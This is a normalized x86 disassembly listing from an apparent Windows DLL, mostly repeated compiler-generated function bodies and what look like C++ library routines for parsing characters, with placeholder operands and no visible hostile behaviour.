mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10040ed5
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041c4b
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004101d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041ce8
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100410d5
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041d85
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041174
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041e22
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041213
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041ebf
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041322
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041f5c
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10040e36
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041ff9
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100413c1
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10042096
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041460
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10042133
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100414ff
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_100421d0
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100415da
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1004226d
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041722
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1004230a
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100417da
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_100423a7
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041879
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10042444
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041918
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_100424e1
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100419d3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1004257e
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041a72
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1004261b
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10040cf4
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_100426b8
mov edi edi
push esi
push edi
mov esi ecx
call sub_1003277b
mov edi eax
test edi edi
je r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_10001c62
push edi
call sub_10024aba
pop ecx
mov eax r--data
cmp [ esi + 0x1c ] 0x10
jb r-xdata
lea eax [ esi + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
pop edi
pop esi
retn
sub_100426f7
mov edi edi
push esi
push edi
mov esi ecx
call sub_10032884
mov edi eax
test edi edi
je r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_10001c62
push edi
call sub_10024aba
pop ecx
mov eax r--data
cmp [ esi + 0x38 ] 0x10
jb r-xdata
lea eax [ esi + 0x24 ]
jmp r-xdata
mov eax [ esi + 0x24 ]
jmp r-xdata
pop edi
pop esi
retn
sub_10042736
push 0x50
mov eax sub_1004c041
call sub_1002826c
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10003446
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10042133
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10003c49
lea ecx [ ebp - 0x2c ]
call sub_100403af
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_100403d0
mov [ ebp - 0x4 ] 0x3
call sub_100403e9
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_100282ef
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10040636
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_100400d2
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1003f6d9
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1003f6a2
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_1003f6d9
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100400d2
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_1004287f
push 0x16c
mov eax sub_1004c146
call sub_1002826c
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
and [ ebp - 0x70 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0xa8 ] edi
mov ecx edi
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10041e22
pop ecx
mov ebx eax
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xb0 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10041ebf
mov ebx eax
pop ecx
mov [ ebp - 0xa0 ] ebx
lea ecx [ ebp - 0xb0 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx 0x4
jae r-xdata
call sub_10003c49
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_10003efc
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10003efc
mov eax [ ebx ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x70 ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10001629
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10001500
mov eax [ ebp - 0x7c ]
call sub_100282ef
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008a30
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x90 ]
cmp [ ebp - 0x65 ] 0x0
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10003950
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10003c49
mov edi [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100403d0
test [ edi + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_100087f2
mov ecx [ ebp - 0x7c ]
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
call sub_10040596
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008a50
push eax
lea ecx [ ebp - 0x8c ]
call sub_10005239
mov ecx eax
call sub_10008544
test al al
jne r-xdata
mov ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xa8 ]
push [ ebp - 0x74 ]
push edi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x90 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_100081f6
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008a50
push eax
lea ecx [ ebp - 0x8c ]
call sub_10008544
test al al
je r-xdata
mov ecx edi
call sub_10007c7b
mov edx [ esi ]
movzx eax ax
push eax
push 0x48
mov ecx esi
call [ edx + 0x8 ]
test al al
je r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008a30
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x94 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10007c7b
cmp ax [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x124 ]
push eax
mov ecx ebx
call sub_100403e9
or [ ebp - 0x70 ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ ebp - 0x84 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push esi
push 0x30
call sub_100087f2
movzx eax ax
mov [ ebp - 0x80 ] eax
add esp 0xc
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_10040467
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_10005274
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10007c7b
cmp ax [ esi ]
jne r-xdata
mov ecx edi
call sub_10007d14
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_100081f6
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001629
mov [ ebp - 0x76 ] 0x0
lea eax [ ebp - 0xec ]
push eax
mov ecx ebx
call sub_100403e9
or [ ebp - 0x70 ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_10005326
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10007c7b
mov [ ebp - 0x76 ] 0x1
cmp [ esi ] ax
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0xb8 ] eax
cmp ax si
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10007d14
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008a50
push eax
lea ecx [ ebp - 0x98 ]
call sub_10008544
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10008a50
push eax
lea ecx [ ebp - 0x98 ]
call sub_10008544
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x70 ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xec ]
call sub_10001500
xor esi esi
test [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10007c7b
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov edi [ ebp - 0x6c ]
push edi
movzx esi ax
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea ecx [ ebp - 0x98 ]
call sub_10005274
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10007c7b
cmp ax [ esi ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx [ ebp - 0x6c ]
call sub_10007c7b
cmp ax [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x76 ] 0x0
je r-xdata
